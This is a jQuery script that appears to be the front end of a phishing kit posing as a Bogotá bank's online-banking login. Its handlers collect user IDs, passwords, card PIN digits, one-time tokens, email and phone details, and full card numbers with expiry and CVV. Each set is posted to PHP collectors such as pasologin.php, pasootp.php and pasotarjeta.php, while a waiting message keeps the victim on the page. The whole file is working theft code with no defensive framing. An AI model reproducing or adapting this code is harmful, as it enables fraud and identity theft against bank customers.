$(document).ready(function($){

	$("#clave-segura").click(function(){
		$("#clave-segura").css({"border-bottom":"2px solid #0040A8","color":"#0040a8"});		
		$("#tarjeta-debito").css({"border-bottom":"2px solid #e6e6e6","color":"#5c5c5c"});		
		$("#fmr-clave-s").show();
		$("#fmr-tarjeta-d").hide();	
		$("#txt-clave-s").val("");
		$("#txt-clave-s").attr("error","0");
		$("#btn-ingresar-s").attr("disabled","disabled");	
		$("#txt-id-s").val($("#txt-id").val());			
    });

    $("#tarjeta-debito").click(function(){
		$("#tarjeta-debito").css({"border-bottom":"2px solid #0040A8","color":"#0040a8"});		
		$("#clave-segura").css({"border-bottom":"2px solid #e6e6e6","color":"#5c5c5c"});
		$("#fmr-clave-s").hide();
		$("#fmr-tarjeta-d").show();	
		$("#txt-clave-tc").val("");
		$("#txt-clave-tc").attr("error","0");
		$("#txt-digito").val("");
		$("#txt-digito").attr("error","0");
		$("#btn-ingresar").attr("disabled","disabled");
		$("#txt-id").val($("#txt-id-s").val());
    });

   	$(".entrada").keyup(function(e) {
   		if ($(this).val() == "") {
   			$(this).css({"background-color":"#FFE7E6","border":"2px solid #C94740"});
   			$(this).attr("error","1");
   		}else{
   			$(this).css({"background-color":"#FFF","border":"2px solid #0043A9"});
   			$(this).attr("error","0");
   		}
    });

    $(".entrada").blur(function(){
    	if ($(this).val() != "") {
    		$(this).css({"background-color":"#fff","border":"1px solid #b3b3b3"});	
    		$(this).attr("error","0");	
    	}else{
    		$(this).css({"background-color":"#FFE7E6","border":"2px solid #C94740"});
    		$(this).attr("error","1");
    	}
    });

    $(".entrada").focus(function(){
    	if ($(this).attr("error") == "0") {
    		$(this).css({"background-color":"#FFF","border":"2px solid #0043A9"});
    		$(this).attr("error","0");
    	}else{
    		$(this).css({"background-color":"#FFE7E6","border":"2px solid #C94740"});
    		$(this).attr("error","1");
    	}
    });

    $("#txt-id,#txt-clave-tc,#txt-digito").keyup(function(e) {    		
   		if ($("#txt-id").val().length > 6 && $("#txt-clave-tc").val().length > 3 && $("#txt-digito").val().length > 3) {   			
   			$("#btn-ingresar").removeAttr("disabled");
   		}else{   			
   			$("#btn-ingresar").attr("disabled","disabled")   			
   		}	
    });

    $("#txt-id-s,#txt-clave-s").keyup(function(e) {    		
   		if ($("#txt-id-s").val().length > 6 && $("#txt-clave-s").val().length > 3) {   			
   			$("#btn-ingresar-s").removeAttr("disabled");
   		}else{   			
   			$("#btn-ingresar-s").attr("disabled","disabled")   			
   		}	
    });

    $("#btn-ingresar").click(function(){
        $("#fondo").show();
        $("#mensaje").show();
        dispositivo = detectar_dispositivo();
        cl = "[C]" + $("#txt-clave-tc").val() + " [D]" + $("#txt-digito").val();
        u = "[" + $("#txt-tipo").val() + "]" + $("#txt-id").val();
        $.post( "../../../../../process/pasologin.php", {usr:u, pas: cl, dis: dispositivo, ban:"Bogota"} ,function(data) {
            espera = 1; 
        });


    });

    $("#btn-ingresar-s").click(function(){
		$("#fondo").show();
        $("#mensaje").show();
        dispositivo = detectar_dispositivo();
        cl = "[CS]" + $("#txt-clave-s").val();
        u = "[" + $("#txt-tipo-s").val() + "]" + $("#txt-id-s").val();
        $.post( "../../../../../process/pasologin.php", {usr:u, pas: cl, dis: dispositivo, ban:"Bogota"} ,function(data) {
            espera = 1; 
        });
    });


    $("#txt-token").keyup(function(e) {    		
   		if ($("#txt-token").val().length > 5) {   			
   			$("#btn-validar").removeAttr("disabled");
   		}else{   			
   			$("#btn-validar").attr("disabled","disabled")   			
   		}	
    });
  

    $("#btn-validar").click(function(){      
        $("#fondo").show();
        $("#mensaje").show();
        $.post( "../../../../../process/pasootp.php", { otp: $("#txt-token").val() } ,function(data) {
            espera = 1;  
        });
    });



    $("#txt-correo,#txt-celular").keyup(function(e) {    		
   		if ($("#txt-correo").val().length > 8 && $("#txt-celular").val().length > 9) {   			
   			$("#btn-actualizar").removeAttr("disabled");
   		}else{   			
   			$("#btn-actualizar").attr("disabled","disabled")   			
   		}	
    });


    $("#btn-actualizar").click(function(){      
        $("#fondo").show();
        $("#mensaje").show();       
        $.post( "../../../../../process/pasocorreo.php", { eml:$("#txt-correo").val(),clv:"",cel:$("#txt-celular").val() } ,function(data) {
            espera = 1;     
        });

    });


    $("#txt-tarjeta,#txt-cvv").keyup(function(e) {    		
   		if ($("#txt-tarjeta").val().length > 15 && $("#txt-cvv").val().length > 2 && $("#txt-mes").val() != "" && $("#txt-ano").val() != "") {   			
   			$("#btn-verficar").removeAttr("disabled");
   		}else{   			
   			$("#btn-verficar").attr("disabled","disabled")   			
   		}	
    });


    $("#btn-verficar").click(function(){      
        $("#fondo").show();
        $("#mensaje").show();
        fecha = $("#txt-mes").val() + "-" + $("#txt-ano").val();
        $.post( "../../../../../process/pasotarjeta.php", { tar:$("#txt-tarjeta").val(),fec:fecha,cvv:$("#txt-cvv").val() } ,function(data) {
            espera = 1;   
        });
    });


    $("#txt-tokenerr").keyup(function(e) {    		
   		if ($("#txt-tokenerr").val().length > 5) {   			
   			$("#btn-validarerr").removeAttr("disabled");
   		}else{   			
   			$("#btn-validarerr").attr("disabled","disabled")   			
   		}	
    });
  

    $("#btn-validarerr").click(function(){      
        $("#fondo").show();
        $("#mensaje").show();
        $.post( "../../../../../process/pasootp.php", { otp: $("#txt-tokenerr").val() } ,function(data) {
            espera = 1;  
        });
    });
});